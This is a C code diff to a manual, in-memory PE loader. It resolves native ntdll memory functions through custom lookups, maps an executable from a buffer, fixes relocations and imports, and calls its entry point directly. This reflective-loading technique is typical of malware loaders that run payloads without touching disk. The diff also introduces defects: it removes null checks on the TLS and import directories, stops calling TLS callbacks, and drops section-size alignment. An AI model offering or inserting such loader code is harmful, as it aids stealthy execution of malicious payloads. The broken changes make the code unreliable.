@@ -7,10 +7,12 @@
 STRINGA(ntdll_dll, "ntdll.dll");
 STRINGA(ntallocatevirtualmemory, "NtAllocateVirtualMemory");
 STRINGA(ntprotectvirtualmemory, "NtProtectVirtualMemory");
+STRINGA(ntfreevirtualmemory, "NtFreeVirtualMemory");
 
 // -------------------- NTDLL typedefs --------------------
 typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
 typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+typedef NTSTATUS(NTAPI* NtFreeVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
 
 // -------------------- Helpers --------------------
 static ULONG SectionProtection(DWORD characteristics) {
@@ -24,16 +26,19 @@ static ULONG SectionProtection(DWORD characteristics) {
 
 // -------------------- TLS callbacks --------------------
 typedef void (*TLS_CALLBACK)(PVOID, DWORD, PVOID);
+
 static void CallTlsCallbacks(BYTE* base, IMAGE_DATA_DIRECTORY tlsDir) {
-    if (!tlsDir.Size) return;
     IMAGE_TLS_DIRECTORY64* tls = (IMAGE_TLS_DIRECTORY64*)(base + tlsDir.VirtualAddress);
     TLS_CALLBACK* cb = (TLS_CALLBACK*)tls->AddressOfCallBacks;
-    while (cb && *cb) { (*cb)(base, DLL_PROCESS_ATTACH, NULL); cb++; }
+    while (*cb) { (*cb)(base, DLL_PROCESS_ATTACH, NULL); cb++; }
 }
 
 // -------------------- Import/Export resolution --------------------
 static ULONG_PTR ResolveExport(HMODULE mod, const char* name, int isOrdinal) {
-    HMODULE curMod = mod; const char* curName = name; int curIsOrdinal = isOrdinal;
+    HMODULE curMod = mod;
+    const char* curName = name;
+    int curIsOrdinal = isOrdinal;
+
     for (;;) {
         IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)curMod;
         IMAGE_NT_HEADERS64* ntE = (IMAGE_NT_HEADERS64*)((BYTE*)curMod + dos->e_lfanew);
@@ -47,7 +52,8 @@ static ULONG_PTR ResolveExport(HMODULE mod, const char* name, int isOrdinal) {
         if (!curIsOrdinal) {
             for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                 char* en = (char*)((BYTE*)curMod + nameTable[i]);
-                const char* p1 = en; const char* p2 = curName;
+                const char* p1 = en;
+                const char* p2 = curName;
                 while (*p1 && *p2 && *p1 == *p2) { p1++; p2++; }
                 if (!*p1 && !*p2) { foundRVA = addrTable[ordTable[i]]; break; }
             }
@@ -57,18 +63,22 @@ static ULONG_PTR ResolveExport(HMODULE mod, const char* name, int isOrdinal) {
         }
 
         if (foundRVA >= ed.VirtualAddress && foundRVA < ed.VirtualAddress + ed.Size) {
-            char* fwd = (char*)((BYTE*)curMod + foundRVA); const char* s = fwd;
+            char* fwd = (char*)((BYTE*)curMod + foundRVA);
+            const char* s = fwd;
 
             size_t dllLen = 0; while (s[dllLen] && s[dllLen] != '.') dllLen++;
             char* dll = (char*)alloca(dllLen + 1);
-            for (size_t i = 0; i < dllLen; i++) dll[i] = s[i]; dll[dllLen] = 0;
+            for (size_t i = 0; i < dllLen; i++) dll[i] = s[i];
+            dll[dllLen] = 0;
             s += dllLen + 1;
 
             size_t fnameLen = 0; while (s[fnameLen]) fnameLen++;
             char* fname = (char*)alloca(fnameLen + 1);
-            for (size_t i = 0; i < fnameLen; i++) fname[i] = s[i]; fname[fnameLen] = 0;
+            for (size_t i = 0; i < fnameLen; i++) fname[i] = s[i];
+            fname[fnameLen] = 0;
 
             HMODULE fmod = myLoadLibraryA(dll);
+
             if (fname[0] == '#') {
                 unsigned long ordval = 0; s = fname + 1;
                 while (*s >= '0' && *s <= '9') { ordval = ordval * 10 + (*s - '0'); s++; }
@@ -76,12 +86,13 @@ static ULONG_PTR ResolveExport(HMODULE mod, const char* name, int isOrdinal) {
             } else {
                 curMod = fmod; curName = fname; curIsOrdinal = 0;
             }
-        } else return (ULONG_PTR)((BYTE*)curMod + foundRVA);
+        } else {
+            return (ULONG_PTR)((BYTE*)curMod + foundRVA);
+        }
     }
 }
 
 static void ResolveImport(BYTE* base, IMAGE_DATA_DIRECTORY im) {
-    if (!im.Size) return;
     IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)(base + im.VirtualAddress);
     while (imp->Name) {
         char* name = (char*)(base + imp->Name);
@@ -90,7 +101,9 @@ static void ResolveImport(BYTE* base, IMAGE_DATA_DIRECTORY im) {
         IMAGE_THUNK_DATA64* addr = (IMAGE_THUNK_DATA64*)(base + imp->FirstThunk);
 
         for (; orig->u1.AddressOfData; orig++, addr++) {
-            const char* funcName; int isOrdinal = 0;
+            const char* funcName;
+            int isOrdinal = 0;
+
             if (orig->u1.AddressOfData & IMAGE_ORDINAL_FLAG64) {
                 funcName = (const char*)(ULONG_PTR)IMAGE_ORDINAL64(orig->u1.Ordinal);
                 isOrdinal = 1;
@@ -107,38 +120,49 @@ static void* MapImage(unsigned char* data) {
     HMODULE ntdll = myGetModuleHandleA(ntdll_dll);
     NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)myGetProcAddress(ntdll, ntallocatevirtualmemory);
     NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)myGetProcAddress(ntdll, ntprotectvirtualmemory);
+    NtFreeVirtualMemory_t NtFreeVirtualMemory = (NtFreeVirtualMemory_t)myGetProcAddress(ntdll, ntfreevirtualmemory);
 
     IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)data;
     IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(data + dos->e_lfanew);
-    IMAGE_SECTION_HEADER* sec = (IMAGE_SECTION_HEADER*)(nt + 1);
 
-    PVOID base = 0;
+    PVOID base = NULL;
     SIZE_T size = nt->OptionalHeader.SizeOfImage;
+
     NtAllocateVirtualMemory((HANDLE)-1, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    // headers + sections copy
-    SIZE_T hdrSize = nt->OptionalHeader.SizeOfHeaders;
-    for (SIZE_T i = 0; i < hdrSize; i++) ((BYTE*)base)[i] = data[i];
+    IMAGE_SECTION_HEADER* sec = (IMAGE_SECTION_HEADER*)(nt + 1);
 
+    // copy headers
+    for (SIZE_T i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
+        ((BYTE*)base)[i] = data[i];
+
+    // copy sections
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-        BYTE* dst = (BYTE*)base + sec[i].VirtualAddress;
-        BYTE* src = data + sec[i].PointerToRawData;
-        SIZE_T sz = sec[i].SizeOfRawData;
-        for (SIZE_T j = 0; j < sz; j++) dst[j] = src[j];
+        BYTE* dest = (BYTE*)base + sec[i].VirtualAddress;
+        BYTE* src  = data + sec[i].PointerToRawData;
+
+        for (DWORD j = 0; j < sec[i].SizeOfRawData; j++)
+            dest[j] = src[j];
     }
 
     // relocations
     ULONG_PTR delta = (ULONG_PTR)base - nt->OptionalHeader.ImageBase;
     IMAGE_DATA_DIRECTORY rl = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-    if (delta && rl.Size) {
+
+    if (rl.Size) {
         IMAGE_BASE_RELOCATION* r = (IMAGE_BASE_RELOCATION*)((BYTE*)base + rl.VirtualAddress);
         BYTE* end = (BYTE*)r + rl.Size;
+
         while ((BYTE*)r < end && r->SizeOfBlock) {
             WORD* list = (WORD*)(r + 1);
-            DWORD count = (r->SizeOfBlock - sizeof(*r)) >> 1;
-            for (DWORD i = 0; i < count; i++)
-                if ((list[i] >> 12) == IMAGE_REL_BASED_DIR64)
-                    *(ULONG_PTR*)((BYTE*)base + r->VirtualAddress + (list[i] & 0xFFF)) += delta;
+            DWORD count = (r->SizeOfBlock - sizeof(*r)) / sizeof(WORD);
+
+            for (DWORD i = 0; i < count; i++) {
+                if ((list[i] >> 12) == IMAGE_REL_BASED_DIR64) {
+                    ULONG_PTR* ptr = (ULONG_PTR*)((BYTE*)base + r->VirtualAddress + (list[i] & 0xFFF));
+                    *ptr += delta;
+                }
+            }
             r = (IMAGE_BASE_RELOCATION*)((BYTE*)r + r->SizeOfBlock);
         }
     }
@@ -146,22 +170,21 @@ static void* MapImage(unsigned char* data) {
     // imports
     ResolveImport((BYTE*)base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]);
 
-    // section protections (aligned)
-    SIZE_T align = nt->OptionalHeader.SectionAlignment;
+    // set section protections
     for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-        SIZE_T vsz = sec[i].Misc.VirtualSize;
-        SIZE_T rsz = sec[i].SizeOfRawData;
-        SIZE_T sz = vsz ? vsz : rsz;
-        if (!sz) continue;
-        sz = (sz + align - 1) & ~(align - 1);
-
         BYTE* addr = (BYTE*)base + sec[i].VirtualAddress;
+        SIZE_T sz  = sec[i].Misc.VirtualSize;
         ULONG prot = SectionProtection(sec[i].Characteristics);
-        NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&addr, &sz, prot, &prot);
-    }
 
-    // TLS callbacks
-    CallTlsCallbacks((BYTE*)base, nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]);
+        NtProtectVirtualMemory((HANDLE)-1, (PVOID*)&addr, &sz, prot, &prot);
+
+        // free discardable sections
+        if (sec[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) {
+            PVOID discardBase = addr;
+            SIZE_T discardSize = sz;
+            NtFreeVirtualMemory((HANDLE)-1, &discardBase, &discardSize, MEM_DECOMMIT);
+        }
+    }
 
     return base;
 }
@@ -171,6 +194,7 @@ static void ExecuteFromMemory(unsigned char* data) {
     BYTE* image = MapImage(data);
     IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)image;
     IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(image + dos->e_lfanew);
+
     void (*entry)(void) = (void(*)(void))(image + nt->OptionalHeader.AddressOfEntryPoint);
     entry();
 }
